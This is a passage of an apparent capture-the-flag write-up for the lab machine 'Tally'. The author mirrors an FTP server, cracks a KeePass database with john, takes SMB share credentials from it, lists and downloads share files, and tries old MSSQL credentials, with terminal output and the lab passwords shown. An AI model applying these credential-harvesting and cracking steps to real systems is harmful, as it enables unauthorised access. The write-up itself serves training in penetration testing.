+                09-15-17&nbsp;&nbsp;08:30PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To-Upload<br>
+                09-17-17&nbsp;&nbsp;08:27PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User<br>
+                226&nbsp;Transfer&nbsp;complete.</span>
+            </div>
+        </div><br>
+        <br>
+        Lots of files.<br>
+        Download all the files from FTP with <code>wget</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wget&nbsp;-r&nbsp;ftp://ftp_user:UTDRSCH53c\"\$6hys@10.10.10.59</span><br>
+                --2019-11-05&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>27<span style="color:#ff9d00;font-weight:700">:</span>40--&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ftp://</span>ftp_user<span style="color:#ff9d00;font-weight:700">:</span>*password*@10.10.10.59<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;‘10.10.10.59<span style="color:#ff9d00;font-weight:700">/</span>.listing’<br>
+                Connecting&nbsp;to&nbsp;10.10.10.59<span style="color:#ff9d00;font-weight:700">:</span>21...&nbsp;connected.<br>
+                Logging&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;as&nbsp;ftp_user&nbsp;...&nbsp;Logged&nbsp;in<span style="color:#ff9d00;font-weight:700">!</span><br>
+                ==&gt;&nbsp;SYST&nbsp;...&nbsp;done.&nbsp;&nbsp;&nbsp;&nbsp;==&gt;&nbsp;PWD&nbsp;...&nbsp;done.<br>
+                ==&gt;&nbsp;TYPE&nbsp;I&nbsp;...&nbsp;done.&nbsp;&nbsp;==&gt;&nbsp;CWD&nbsp;not&nbsp;needed.<br>
+                ==&gt;&nbsp;PASV&nbsp;...&nbsp;done.&nbsp;&nbsp;&nbsp;&nbsp;==&gt;&nbsp;LIST&nbsp;...&nbsp;done.<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        List all the files you downloaded with <code>tree</code><br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#tree&nbsp;10.10.10.59/</span><br>
+                10.10.10.59<span style="color:#ff9d00;font-weight:700">/</span><br>
+                ├──&nbsp;From-Custodian<br>
+                │&nbsp;&nbsp;&nbsp;├──&nbsp;RED-528103410.log<br>
+                │&nbsp;&nbsp;&nbsp;├──&nbsp;[...&nbsp;<span style="color:#ff9d00;font-weight:700">more</span>&nbsp;logs&nbsp;...]<br>
+                ├──&nbsp;Intranet<br>
+                │&nbsp;&nbsp;&nbsp;└──&nbsp;Binaries<br>
+                │&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└──&nbsp;Firefox&nbsp;Setup&nbsp;44.0.2.exe<br>
+                ├──&nbsp;Logs<br>
+                │&nbsp;&nbsp;&nbsp;├──&nbsp;ftp_connect_8235771490510.txt<br>
+                │&nbsp;&nbsp;&nbsp;├──&nbsp;[...&nbsp;<span style="color:#ff9d00;font-weight:700">more</span>&nbsp;logs&nbsp;...]<br>
+                ├──&nbsp;To-Upload<br>
+                │&nbsp;&nbsp;&nbsp;├──&nbsp;employees-id_number.xlsx<br>
+                │&nbsp;&nbsp;&nbsp;└──&nbsp;Invoices.zip<br>
+                └──&nbsp;User<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Administrator<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;New&nbsp;folder<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Ekta<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;OFSI_quick_guide_flyer.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;PSAIS_1_April_2017.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Jess<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;actu8-espreadsheet-designer-datasheet.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Paul<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;financial-list-guide.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;financial_sanctions_guidance_august_2017.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;Monetary_penalties_for_breaches_of_financial_sanctions.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;New&nbsp;folder<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Rahul<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;Mockups-Backup<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Sarah<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;MBSASetup-x64-EN.msi<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;notes.txt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;Windows-KB890830-x64-V5.52.exe<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Stuart<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;customers&nbsp;-&nbsp;Copy.csv<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;Unit4-Connect-Financials-Agenda.pdf<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Tim<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;Files<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;bonus.txt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePass-2.36<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePass.chm<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePass.exe<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePass.exe.config<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePassLibC32.dll<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePassLibC64.dll<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;KeePass.XmlSerializers.dll<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;├──&nbsp;License.txt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;ShInstUtil.exe<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;tim.kdbx<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;Project<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Communications<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;├──&nbsp;Log<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;└──&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;to.txt<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;│&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└──&nbsp;Vendors<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;└──&nbsp;Yenwi<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;└──&nbsp;Archive<br>
+                <br>
+                25&nbsp;directories,&nbsp;125&nbsp;files
+            </div>
+        </div><br>
+        <br>
+        Tim's <code>do to.txt</code> says his SMB credentials are in KeePass.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;10.10.10.59/User/Tim/Project/Log/do\&nbsp;to.txt</span><br>
+                To&nbsp;do<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <br>
+                Remove&nbsp;migration&nbsp;folder<br>
+                Set&nbsp;secure&nbsp;share&nbsp;permissions<br>
+                <br>
+                encrypted&nbsp;share&nbsp;creds<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <br>
+                password&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;keepass
+            </div>
+        </div><br>
+        <br>
+        Copy Tim's keepass database to a working directory, use <code>keepass2john</code> to extract a hash to crack and crack it with <code>john</code>.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cp&nbsp;10.10.10.59/User/Tim/Files/tim.kdbx&nbsp;.</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#keepass2john&nbsp;tim.kdbx&nbsp;&gt;&nbsp;keepass.hash</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/ftp</span>]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;--format=KeePass&nbsp;keepass.hash</span><br>
+                [...]<br>
+                simplementeyo&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>tim<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        Open the database with KeePass, and you'll find the SMB credentials (as well as 2 others).<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        <span style="text-decoration:underline;">TALLY ACCT share</span><br>
+        Username - <code>Finance</code><br>
+        Password - <code>Acc0unting</code><br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) 139/smb</strong></h2><br>
+        Use SMB map to check which shares you can access with your new credentials.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>smb]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbmap&nbsp;-u&nbsp;Finance&nbsp;-p&nbsp;Acc0unting&nbsp;-H&nbsp;10.10.10.59</span><br>
+                [+]&nbsp;Finding&nbsp;open&nbsp;SMB&nbsp;ports....<br>
+                [+]&nbsp;User&nbsp;SMB&nbsp;session&nbsp;establishd&nbsp;on&nbsp;10.10.10.59...<br>
+                [+]&nbsp;IP<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;10.10.10.59<span style="color:#ff9d00;font-weight:700">:</span>445 Name<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;tally&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Permissions<br>
+                ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------<br>
+                ACCT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; READ&nbsp;ONLY<br>
+                ADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
+                C$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; NO&nbsp;ACCESS<br>
+                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; READ&nbsp;ONLY
+            </div>
+        </div><br>
+        <br>
+        <code>smbmap</code> can also recursively list the files in the share.<br>
+        <code>smbclient //10.10.10.59/ACCT -U Finance -s ‘ACCT’ -R</code><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>4a) conn-info.txt</strong></h3><br>
+        Close to the top of the recursive file listing I saw <code>conn-info.txt</code> in a folder named <code>SQL</code>, so I logged in and downloaded it.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>smb]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbclient&nbsp;//10.10.10.59/ACCT&nbsp;-U&nbsp;Finance</span><br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\F</span>inance&nbsp;s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;zz_Archived<span style="color:#333333;font-weight:400">\S</span>QL<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;get&nbsp;conn_info.txt<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>smb]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#cat&nbsp;conn-info.txt&nbsp;</span><br>
+                old&nbsp;server&nbsp;details<br>
+                <br>
+                db<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;sa<br>
+                pass<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;YE%TJC%<span style="color:#ff9d00;font-weight:700">&amp;</span>HYbe5Nw<br>
+                <br>
+                have&nbsp;changed&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;tally
+            </div>
+        </div><br>
+        <br>
+        But apparently the credentials inside this file are old.<br>
+        <br>
+        And it's true, the credentials don't work.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>mssql]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mssqlclient.py&nbsp;sa@10.10.10.59</span><br>
+                Impacket&nbsp;v0.9.21-dev&nbsp;-&nbsp;Copyright&nbsp;2019&nbsp;SecureAuth&nbsp;Corporation<br>
+                <br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;YE%TJC%<span style="color:#ff9d00;font-weight:700">&amp;</span>HYbe5Nw<br>
+                [*]&nbsp;Encryption&nbsp;required,&nbsp;switching&nbsp;to&nbsp;TLS<br>
+                [-]&nbsp;ERROR<span style="color:#ff9d00;font-weight:700">(</span>TALLY<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;Line&nbsp;1<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Login&nbsp;failed&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">user</span>&nbsp;'sa'.
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>4b) tester.exe</strong></h3><br>
+        In Tim's notes from the SMB share he wrote that he needs to delete <code>zz_Migration</code> folder, so investigate that.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tally<span style="color:#ff9d00;font-weight:700">/</span>smb]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#smbclient&nbsp;//10.10.10.59/ACCT&nbsp;-U&nbsp;Finance</span><br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\F</span>inance&nbsp;s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;zz_Migration<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>13&nbsp;2017<br>
+                &nbsp;&nbsp;..&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>13&nbsp;2017<br>
+                &nbsp;&nbsp;Backup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;Sep&nbsp;11&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>55<span style="color:#ff9d00;font-weight:700">:</span>43&nbsp;2017<br>
+                &nbsp;&nbsp;Binaries&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>13&nbsp;2017<br>
+                &nbsp;&nbsp;install-notes.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;&nbsp;11762&nbsp;&nbsp;Mon&nbsp;Aug&nbsp;28&nbsp;18<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#ff9d00;font-weight:700">:</span>31&nbsp;2017<br>
+                &nbsp;&nbsp;Integration&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Mon&nbsp;Sep&nbsp;11&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#ff9d00;font-weight:700">:</span>21&nbsp;2017<br>
+                &nbsp;&nbsp;Sage&nbsp;50&nbsp;v1.9.3.1&nbsp;Hotfix&nbsp;1&nbsp;Release&nbsp;Notes.pdf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;406181&nbsp;&nbsp;Fri&nbsp;Sep&nbsp;15&nbsp;20<span style="color:#ff9d00;font-weight:700">:</span>49<span style="color:#ff9d00;font-weight:700">:</span>53&nbsp;2017
+            </div>
+        </div><br>
+        <br>
+        Nothing in <code>install-notes.txt</code><br>
+        <br>
+        <code>Binaries</code> looks interesting, as does the <code>New folder</code> inside it, partly because of the name and partly becuase it was edited most recently.<br>
+            <div class="codebox">
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;Binaries<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\z</span>z_Migration<span style="color:#333333;font-weight:400">\B</span>inaries<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;Sun&nbsp;Sep&nbsp;17&nbsp;21<span style="color:#ff9d00;font-weight:700">:</span>20<span style="color:#ff9d00;font-weight:700">:</span>13&nbsp;2017<br>
